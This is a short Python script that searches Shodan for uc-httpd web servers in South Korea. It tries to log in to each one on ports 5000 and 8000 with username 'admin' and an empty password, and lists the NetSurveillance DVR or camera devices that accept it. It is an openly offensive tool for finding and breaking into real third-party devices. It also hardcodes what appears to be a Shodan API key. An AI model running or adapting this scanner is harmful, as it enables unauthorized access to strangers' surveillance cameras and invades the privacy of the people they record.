import shodan
from colorama import Fore
import requests
from bs4 import BeautifulSoup
 
SHODAN_API_KEY = 'GKja8yvDZh5B1gDF6jhz64hTJkPtOCUV' 
 
query='uc-httpd country:KR'
data=(('command','login'),('username','admin'),('password',''))
def shodan_query():
    try:
        api = shodan.Shodan(SHODAN_API_KEY)
        result = api.search(query, page=1)
    except shodan.APIError as e:
        print (Fore.RED + e.value + Fore.RESET)
        return False
 
    if len(result['matches']) > 0:
        print ('Found ' + str(result['total']) + " results")
 
    else:
        print ("Nothing was found")
        return False
 
    return result
 
def query_print(result):
    for service in result['matches']: 
        try:
            if service['port'] == 5000 or service['port'] == 8000: 
                    login_url='http://'+service['ip_str']+':'+str(service['port'])+'//Login.htm'
            resp=requests.post(login_url,data=data) 
            soup=BeautifulSoup(resp.text,'lxml')
            if soup.title.text == "NetSurveillance": 
                print ("IP: " + Fore.LIGHTBLUE_EX + service['ip_str'] + Fore.RESET)
                print ("port: " + Fore.LIGHTBLUE_EX + str(service['port']) + Fore.RESET)
                print ("----------------------------")
        except KeyError:
            pass
    
if __name__=="__main__":
    results=shodan_query()
    query_print(results)
